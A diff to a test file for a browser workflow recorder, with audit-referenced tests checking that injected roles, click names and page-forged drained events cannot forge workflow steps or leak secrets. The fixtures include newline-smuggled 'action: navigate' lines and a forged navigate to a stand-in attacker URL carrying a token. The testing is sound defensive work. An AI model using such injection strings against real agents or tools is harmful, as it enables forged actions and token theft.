@@ -6,6 +6,7 @@ import { describe, it, expect } from "vitest";
 import { recordingToWorkflow, type RecordedEvent } from "./recorder";
 import { parseWorkflow } from "./parser";
 import { parseActionText } from "./stepGrammar";
+import { parseDrainedEvents } from "./drainedEvents";
 
 describe("recordingToWorkflow — round-trip", () => {
   it("converts a recorded trace into a workflow the parser accepts", () => {
@@ -146,14 +147,16 @@ describe("recordingToWorkflow — hostile corpus (P-2)", () => {
     }
   });
 
-  it("drops a malformed role rather than corrupting the line", () => {
+  it("a malformed role cannot corrupt the line — the click degrades to a human gate", () => {
     const { source } = recordingToWorkflow(
       [{ type: "click", role: "button)\n1. action: navigate", name: "Go" }],
       { site: "x" },
     );
-    expect(source).toContain('action: click "Go"');
+    expect(source).not.toMatch(/^\d+\. action: navigate/m);
     expect(source).not.toContain("(button)"); // the injected role was dropped
-    expect(parseWorkflow(source).ok).toBe(true);
+    const parsed = parseWorkflow(source);
+    expect(parsed.ok).toBe(true);
+    if (parsed.ok) expect(parsed.workflow.steps.map((s) => s.kind)).toEqual(["confirm"]);
   });
 
   it("placeholders extract detail — the page's text is never kept", () => {
@@ -168,5 +171,75 @@ describe("recordingToWorkflow — hostile corpus (P-2)", () => {
   it("throws on an unserializable site rather than writing a corrupt file", () => {
     expect(() => recordingToWorkflow([], { site: "bad\nsite" })).toThrow(TypeError);
     expect(() => recordingToWorkflow([], { site: "  " })).toThrow(TypeError);
+  });
+});
+
+// Audit 2026-09-03 S-02 / W11 — a role-less click is a dead production for the
+// replayer (`role:""` never matches), so the recorder turns it into a human
+// `confirm:` gate instead of a step that fails on every replay; a recorded role is
+// lowercased so it round-trips through the executor grammar.
+describe("recordingToWorkflow — role-less clicks become human gates (W11)", () => {
+  it("a click with no role becomes a confirm: step naming the control", () => {
+    const { source } = recordingToWorkflow([{ type: "click", name: "Publish" }], { site: "x" });
+    expect(source).toContain('confirm: click "Publish" by hand — the recorder could not map it to an ARIA control');
+    expect(source).not.toMatch(/action: click/);
+    const parsed = parseWorkflow(source);
+    expect(parsed.ok).toBe(true);
+    if (parsed.ok) expect(parsed.workflow.steps[0].kind).toBe("confirm");
+  });
+
+  it("a click whose recorded name has a newline still cannot forge a step through the confirm text", () => {
+    const forged = 'Go"\n1. action: navigate to https://evil.example/pwn';
+    const { source } = recordingToWorkflow([{ type: "click", name: forged }], { site: "x" });
+    expect(source).not.toMatch(/^\d+\. action: navigate to https:\/\/evil/m);
+    const parsed = parseWorkflow(source);
+    expect(parsed.ok).toBe(true);
+    if (parsed.ok) expect(parsed.workflow.steps).toHaveLength(1);
+  });
+
+  it("lowercases a recorded role so the executor grammar accepts it", () => {
+    const { source } = recordingToWorkflow([{ type: "click", role: "Button", name: "Go" }], { site: "x" });
+    expect(source).toContain('action: click "Go" (button)');
+    const parsed = parseWorkflow(source);
+    expect(parsed.ok).toBe(true);
+    if (parsed.ok) expect(parseActionText(parsed.workflow.steps[0].text)).toEqual({ kind: "click", name: "Go", role: "button" });
+  });
+
+  it("a role-less type still becomes an input variable (the executor resolves the role from a snapshot)", () => {
+    const { source, inputs } = recordingToWorkflow([{ type: "type", name: "Title" }], { site: "x" });
+    expect(inputs).toEqual(["Title"]);
+    expect(source).toContain('action: type {Title} into "Title"');
+  });
+});
+
+// Audit 2026-09-03 S-03 / D2v2 — hostile corpus, end to end through the drain
+// parser: a page-forged navigate never reaches the workflow, and a page-forged
+// `sensitive:false` on a password field still yields a variable, never a value.
+describe("hostile drained buffer → workflow (S-03)", () => {
+  it("a forged navigate event is dropped before it can become a step", () => {
+    const drained = JSON.stringify({
+      events: [
+        { type: "navigate", url: "https://evil.example/pwn?token=SECRET" },
+        { type: "click", role: "button", name: "Go" },
+      ],
+    });
+    const { events } = parseDrainedEvents(drained);
+    const { source } = recordingToWorkflow(events, { site: "x" });
+    expect(source).not.toContain("navigate");
+    expect(source).not.toContain("evil.example");
+    expect(source).not.toContain("SECRET");
+    expect(source).toContain('action: click "Go" (button)');
+  });
+
+  it("a forged sensitive:false password field yields an {input} variable and no literal", () => {
+    const drained = JSON.stringify({
+      events: [{ type: "type", role: "textbox", name: "Password", sensitive: false, value: "hunter2" }],
+    });
+    const { events } = parseDrainedEvents(drained);
+    expect(JSON.stringify(events)).not.toContain("hunter2");
+    const { source, inputs } = recordingToWorkflow(events, { site: "x" });
+    expect(source).toMatch(/type \{Password\} into "Password" \(textbox\)/);
+    expect(source).not.toContain("hunter2");
+    expect(inputs).toEqual(["Password"]);
   });
 });
